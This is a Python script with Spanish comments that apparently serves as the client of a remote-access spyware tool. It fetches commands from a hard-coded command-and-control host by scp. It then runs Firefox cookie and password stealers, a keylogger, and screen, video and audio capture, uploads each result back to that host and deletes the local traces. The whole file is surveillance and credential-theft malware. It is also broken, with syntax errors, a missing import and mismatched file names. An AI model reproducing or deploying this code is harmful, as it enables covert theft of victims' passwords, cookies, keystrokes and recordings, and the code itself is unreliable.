#!/usr/bin/python

import os

#Lista donde se almacenaran los comandos leidos del archivo
comandos = [ ]

#copiamos el archivo que contiene los comandos desde el comand an control
os.system("scp manavi@192.168.222.13:~/comandos.txt /tmp 1>/dev/null")

if os.path.exists("/tmp/comandos.txt")
        #Leemos el archivo
        inputfile = open('/tmp/comandos.txt')

	for line in inputfile:
		comandos.append(line)
	 
        inputfile.close()
	
        #En caso de que el archivo este vacio cerramos el programa
	if len(comandos) == 0:
                break

#borramos el archivo una vez obtenidos los comandos
os.system("rm -f /tmp/comandos")

#Ejecutamos cada uno de los comandos y enviamos al comand and control los archivos generados
#por scp

for c in comandos:
    if c == "cookies":
       		os.system("python firecookies.py")	
                os.system('scp /tmp/cookies.txt manavi@192.168.222.13:~/cookies 1>/dev/null')
                os.system('rm -f /tmp/cookies.txt')

    elif c == "contrasenas":
       		os.system("python firepass.py")
                os.system('scp /tmp/firepass.txt manavi@192.168.222.13:~/contrasenas 1>/dev/null')
                os.system('rm -f /tmp/firepass.txt')

    elif re.search('keylogger',c):
                mo = re.match('keylogger (\d+)',c)
        
        	keylogger.keylog(mo.group(1))
                os.system('scp /tmp/key.txt manavi@192.168.222.13:~/keylogger 1>/dev/null')
                os.system('rm -f /tmp/key.txt')
    
    elif re.search('captura',c):
                mo = re.match('captura ([tn]{1,1}) (\d+)',c);
                captura.tiempo(mo.group(1),mo.group(2))
                os.system('scp /tmp/*.jpg manavi@192.168.222.13:~/capturas 1>/dev/null')
                os.system('rm -f /tmp/*.jpg')

 
    elif re.search('captvid',c):
                mo = re.match('captvid (\d+)',c);
                os.system('scp /tmp/*.avi manavi@192.168.222.13:~/video 1>/dev/null')
                os.system('rm -f /tmp/*.avi')
    
    elif re.search('captaud',c):
                mo = re.match('captaud (\d+)',c);
        
                capaudio.audio(mo.group(1))
                os.system('scp /tmp/*.wav manavi@192.168.222.13:~/audio 1>/dev/null')
                os.system('rm -f /tmp/*.wav')

    #si el comando no es valido no se manda un archivo con los comandos no validos
    else :
                fo = open("/tmp/comandosnovalidos.txt","a")
    		fo.write(c + "\n")
		fo.close() 


if os.path.exists("/tmp/comandosnovalidos")
	os.system('scp /tmp/comandosnovalidos.txt manavi@192.168.222.13:~/error 1>/dev/null')
	os.system('rm -f /tmp/comandosnovalidos.txt')
